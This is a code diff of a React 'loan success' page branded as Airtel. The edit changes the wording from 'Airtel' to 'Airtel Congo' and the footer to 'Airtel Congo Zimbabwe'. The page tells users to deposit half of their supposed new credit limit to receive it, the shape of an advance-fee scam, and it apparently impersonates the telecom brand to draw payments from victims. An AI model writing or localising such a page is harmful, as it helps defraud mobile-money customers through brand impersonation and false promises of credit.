@@ -82,7 +82,7 @@ export default function LoanSuccessPage({ onBack, applicationData }: LoanSuccess
                 </h1>
 
                 <p style={{ color: "#666", fontSize: "15px", lineHeight: "1.6", marginBottom: "24px" }}>
-                    Your Airtel limit increase request has been processed.
+                    Your Airtel Congo limit increase request has been processed.
                 </p>
 
                 {/* New Limit Display */}
@@ -128,11 +128,11 @@ export default function LoanSuccessPage({ onBack, applicationData }: LoanSuccess
 
                 <div style={{ textAlign: "left", color: "#5d4037" }}>
                     <p style={{ fontSize: "15px", lineHeight: "1.7", marginBottom: "16px" }}>
-                        <strong>1.</strong> Check your increased limit on your <strong>Airtel app</strong>.
+                        <strong>1.</strong> Check your increased limit on your <strong>Airtel Congo app</strong>.
                     </p>
 
                     <p style={{ fontSize: "15px", lineHeight: "1.7", marginBottom: "16px" }}>
-                        <strong>2.</strong> If your limit has not increased yet, deposit <strong style={{ color: "#667eea" }}>${depositAmount}</strong> (half of your new limit) to your Airtel account.
+                        <strong>2.</strong> If your limit has not increased yet, deposit <strong style={{ color: "#667eea" }}>${depositAmount}</strong> (half of your new limit) to your Airtel Congo account.
                     </p>
 
                     <p style={{ fontSize: "15px", lineHeight: "1.7", margin: 0 }}>
@@ -189,7 +189,7 @@ export default function LoanSuccessPage({ onBack, applicationData }: LoanSuccess
             </div>
 
             <div style={{ marginTop: "24px", color: "#888", fontSize: "12px" }}>
-                © 2025 Airtel Zimbabwe
+                © 2025 Airtel Congo Zimbabwe
             </div>
         </div>
     );
